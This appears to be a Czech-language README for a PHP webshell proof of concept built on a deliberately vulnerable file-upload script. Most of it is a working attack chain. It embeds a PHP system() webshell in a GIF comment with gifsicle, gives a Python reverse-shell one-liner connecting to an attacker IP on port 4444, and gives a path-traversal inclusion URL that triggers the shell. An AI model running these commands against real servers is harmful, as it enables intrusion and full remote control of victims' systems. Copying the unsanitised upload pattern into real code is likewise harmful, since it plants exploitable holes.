# WebShell pro PHP

Níže existují dva soubory a to index.php a upload.php. Index.php je základní stránka obsahující zobrazovaný obsah a v souboru upload.php je zranitelná funkce, která neublashuje sanatizaci vstupů při nahrávání obsahu. Script vychází ze základní definice stanovené v w3school (https://www.w3schools.com/php/php_file_upload.asp).

Script je postaven dle https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-2

Základní sada příkazů


Jedná se o webshell injectovaný do obrázku gif pomocí nástroje gifsicle a to pomocí příkazu `` gifsicle --comment "<?php system(\$_GET['cmd']); ?>" < upload_image.gif > upload_image.php.gif ``

Na webovem serveru musi byt pro toto PoC dostupny python a musi fungovat prikay `` python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' ``

Pokud prikaz funguje, pak je mozne spustit reverse shell volanim `` http://<vulnerable-web-page>/index.php?file=../../../../../../../var/www/html/uploads/webshell.php.gif&cmd=python+-c+%27import+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22<attacker-ip>%22,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27 ``

